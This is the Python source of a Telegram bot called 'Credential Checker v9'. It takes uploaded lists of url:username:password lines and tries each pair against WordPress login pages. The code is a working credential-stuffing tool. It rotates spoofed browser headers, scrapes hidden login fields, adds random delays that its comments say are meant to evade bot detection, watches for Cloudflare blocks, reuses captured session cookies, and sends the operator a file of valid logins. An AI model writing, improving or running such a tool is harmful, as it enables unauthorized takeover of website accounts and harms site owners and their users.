import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
import random
import time
from datetime import datetime

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Config ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# --- Flask ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot running", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ PARSER ============

def parse_credential_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url_part = parts[0]
    remaining = ':'.join(parts[1:])
    
    user_pass = remaining.rsplit(':', 1)
    if len(user_pass) != 2:
        return None
    
    username = user_pass[0]
    password = user_pass[1]
    url = clean_url(url_part)
    
    return (url, username, password)

def clean_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https://https://', 'https://', url)
    url = re.sub(r'^http://http://', 'http://', url)
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    if '/password' in url:
        url = url.split('/password')[0] + '/login'
    elif '/sign_up' in url:
        url = url.split('/sign_up')[0] + '/login'
    elif '/login' not in url:
        url = url.rstrip('/') + '/login'
    
    return url

# ============ FREE CHECKER ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

# Working cookies storage (shared across checks)
WORKING_COOKIES = {}

async def check_login_smart(session, login_url, username, password):
    """
    Smart checker with multiple techniques
    """
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': login_url.rsplit('/', 1)[0],
        'Referer': login_url,
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Cache-Control': 'max-age=0',
    }
    
    payload = {
        'log': username,
        'pwd': password,
        'rememberme': 'forever',
        'wp-submit': 'Log In',
        'redirect_to': login_url.rsplit('/', 1)[0] + '/wp-admin/',
        'testcookie': '1'
    }
    
    domain = login_url.split('/')[2]
    
    try:
        # Technique 1: Use existing working cookies if available
        if domain in WORKING_COOKIES:
            session.cookie_jar.update_cookies(WORKING_COOKIES[domain])
        
        # Step 1: GET login page (behave like human)
        async with session.get(
            login_url,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=25),
            ssl=False
        ) as get_resp:
            
            get_text = await get_resp.text()
            status = get_resp.status
            
            # Check blocks
            if status == 403:
                return (None, {'error': '403 Blocked', 'retry_after': 60})
            if status == 429:
                return (None, {'error': '429 Rate limited', 'retry_after': 120})
            
            # Check for Cloudflare challenge
            cf_indicators = [
                'cf-browser-verification',
                'Checking your browser',
                'Just a moment',
                'cf-ray',
                '__cf_bm',
                'challenge-platform'
            ]
            if any(x in get_text for x in cf_indicators):
                return (None, {'error': 'Cloudflare challenge', 'retry_after': 300})
            
            # Extract WordPress nonce and other hidden fields
            for match in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', get_text, re.IGNORECASE):
                field_name = match.group(1)
                field_value = match.group(2)
                if field_name and field_value and field_name not in payload:
                    payload[field_name] = field_value
            
            # Look for WordPress test cookie
            test_cookie = re.search(r"document\.cookie\s*=\s*[\"']wordpress_test_cookie=[^\"']+", get_text)
        
        # Human-like delay (CRITICAL - prevents bot detection)
        await asyncio.sleep(random.uniform(5, 10))
        
        # Step 2: POST login
        post_headers = headers.copy()
        post_headers['Content-Length'] = str(len(str(payload)))
        
        async with session.post(
            login_url,
            data=payload,
            headers=post_headers,
            allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=30),
            ssl=False
        ) as resp:
            
            final_url = str(resp.url)
            text = await resp.text()
            status = resp.status
            
            # Get all cookies
            cookies_dict = {}
            for cookie in session.cookie_jar:
                key = getattr(cookie, 'key', str(cookie))
                value = getattr(cookie, 'value', '')
                cookies_dict[key] = value
            
            cookie_names = list(cookies_dict.keys())
            
            result = {
                'status': status,
                'final_url': final_url,
                'cookies': cookie_names[:10],
            }
            
            # ========== SUCCESS CHECKS ==========
            
            # 1. WordPress logged_in cookie (STRONGEST)
            wp_cookies = [c for c in cookie_names if 'wordpress_logged_in' in c]
            if wp_cookies:
                # Save working cookies
                WORKING_COOKIES[domain] = {k: v for k, v in cookies_dict.items() if 'wordpress' in k}
                return (True, {**result, 'reason': 'WP logged_in cookie found', 'cookie': wp_cookies[0]})
            
            # 2. Redirected to wp-admin
            if '/wp-admin' in final_url and 'wp-login' not in final_url:
                WORKING_COOKIES[domain] = {k: v for k, v in cookies_dict.items() if 'wordpress' in k}
                return (True, {**result, 'reason': 'Redirected to wp-admin'})
            
            # 3. Has WordPress auth cookies but no logged_in (maybe 2FA needed)
            auth_cookies = [c for c in cookie_names if any(x in c for x in ['wordpress_', 'wp_'])]
            if auth_cookies and 'login' not in final_url:
                return (True, {**result, 'reason': 'WP auth cookies present', 'cookies': auth_cookies})
            
            # ========== FAILURE CHECKS ==========
            
            text_lower = text.lower()
            
            failure_indicators = {
                'incorrect_password': 'incorrect password' in text_lower or 'the password you entered' in text_lower,
                'invalid_username': 'invalid username' in text_lower or 'invalid email' in text_lower,
                'unknown_email': 'unknown email' in text_lower or 'unknown username' in text_lower,
                'login_failed': 'login failed' in text_lower,
                'auth_failed': 'authentication failed' in text_lower,
                'wrong_password': 'wrong password' in text_lower,
                'shake': 'shake' in text_lower and 'login' in text_lower,
                'error_message': 'error' in text_lower and any(x in text_lower for x in ['login', 'password', 'username']),
            }
            
            if any(failure_indicators.values()):
                failed_reasons = [k for k, v in failure_indicators.items() if v]
                return (False, {**result, 'reason': 'Login failed', 'indicators': failed_reasons})
            
            # Still on login page with no error = likely failed
            if 'wp-login' in final_url or 'loginform' in text_lower:
                # Check for error div
                if re.search(r'<div[^>]*class=["\'][^"\']*error[^"\']*["\']', text, re.IGNORECASE):
                    return (False, {**result, 'reason': 'Error div found on login page'})
                
                # No error but still on login = probably failed
                if len(text) < 5000:  # Small page = error page
                    return (False, {**result, 'reason': 'Still on login page (small response)'})
            
            # Ambiguous
            return (False, {**result, 'reason': 'Unknown response', 'snippet': text[:150]})
            
    except asyncio.TimeoutError:
        return (None, {'error': 'Timeout', 'retry_after': 30})
    except Exception as e:
        return (None, {'error': str(e)[:50], 'retry_after': 10})

async def check_wordpress_free(url, username, password):
    """
    Free checker with retry and delay
    """
    
    timeout = aiohttp.ClientTimeout(total=40)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        
        login_urls = [
            url,
            url.replace('/login', '/wp-login.php'),
        ]
        
        for attempt, login_url in enumerate(login_urls, 1):
            
            # Try login
            result, msg = await check_login_smart(session, login_url, username, password)
            
            if result is not None:
                return (result, {**msg, 'attempt': attempt})
            
            # Got blocked/rate limited
            if 'retry_after' in msg:
                wait_time = msg.get('retry_after', 60)
                logger.warning(f"Blocked, waiting {wait_time}s...")
                await asyncio.sleep(min(wait_time, 120))  # Max 2 min wait
            
            # Try next URL
            if attempt < len(login_urls):
                await asyncio.sleep(random.uniform(3, 5))
        
        return (False, {'error': 'All attempts failed or blocked'})

# ============ PROCESS ============

async def process_credentials(client, message, file_path):
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error: {e}")
        return
    
    credentials = []
    for i, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((i, *parsed))
    
    total = len(credentials)
    if total == 0:
        await message.reply_text("❌ No valid credentials")
        return
    
    await message.reply_text(
        f"🔍 Found {total} credentials\n\n"
        f"⏱️ **Free Mode:** Slow checking (5-10s delay)\n"
        f"🛡️ Cloudflare bypass techniques enabled\n\n"
        f"Starting... This will take ~{total * 8 // 60} minutes"
    )
    
    valid = []
    invalid = []
    blocked = 0
    checked = 0
    
    for num, url, user, pwd in credentials:
        
        is_valid, debug = await check_wordpress_free(url, user, pwd)
        
        entry = f"{url}:{user}:{pwd}"
        
        if is_valid is True:
            valid.append(entry)
            logger.info(f"✅ VALID: {user}")
        else:
            if any(x in str(debug) for x in ['403', '429', 'Cloudflare', 'Blocked']):
                blocked += 1
            invalid.append(f"{entry} | {json.dumps(debug, default=str)[:80]}")
            logger.info(f"❌ INVALID: {user[:20]}... - {debug.get('reason', 'unknown')}")
        
        checked += 1
        
        if checked % 1 == 0 or checked == total:  # Update every check
            eta = (total - checked) * 8 // 60
            await message.reply_text(
                f"⏳ {checked}/{total} ({int(checked/total*100)}%)\n"
                f"✅ Valid: {len(valid)}\n"
                f"❌ Invalid: {len(invalid) - blocked}\n"
                f"🚫 Blocked: {blocked}\n"
                f"⏱️ ETA: ~{eta} min"
            )
        
        # CRITICAL: Long delay to avoid detection
        delay = random.uniform(8, 15) if checked < total else 0
        if delay > 0:
            logger.info(f"Waiting {delay:.1f}s before next check...")
            await asyncio.sleep(delay)
    
    # Results
    summary = (
        f"✅ **Complete!**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Valid: {len(valid)}\n"
        f"❌ Invalid: {len(invalid) - blocked}\n"
        f"🚫 Blocked: {blocked}\n\n"
        f"💡 **Tip:** If many blocked, wait 1 hour and retry"
    )
    await message.reply_text(summary)
    
    if valid:
        fname = f"VALID_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(valid))
        await message.reply_document(fname, caption=f"✅ {len(valid)} Valid Credentials")
        os.remove(fname)
    
    if invalid:
        fname = f"DEBUG_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            f.write('\n'.join(invalid[:20]))
        await message.reply_document(fname, caption="🐛 Debug Info")
        os.remove(fname)
    
    os.remove(file_path)

# ============ BOT ============

app = Client("checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message):
    if not is_admin(message.from_user.id):
        return
    
    await message.reply_text(
        "👨‍💻 **Credential Checker v9 (FREE MODE)**\n\n"
        "✅ No proxy needed\n"
        "✅ Smart Cloudflare bypass\n"
        "✅ Cookie reuse optimization\n\n"
        "⚠️ **Slow Mode:**\n"
        "• 8-15 seconds between checks\n"
        "• ~1 minute per 5 credentials\n\n"
        "Send .txt file to start"
    )

@app.on_message(filters.document)
async def doc(client, message):
    if not is_admin(message.from_user.id):
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Send .txt only")
        return
    
    try:
        path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Download: {e}")
        return
    
    await message.reply_text("📥 Starting free mode check...")
    await process_credentials(client, message, path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def other(client, message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("Send .txt file")

# ============ RUN ============

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("Bot started in FREE mode")
    app.run()
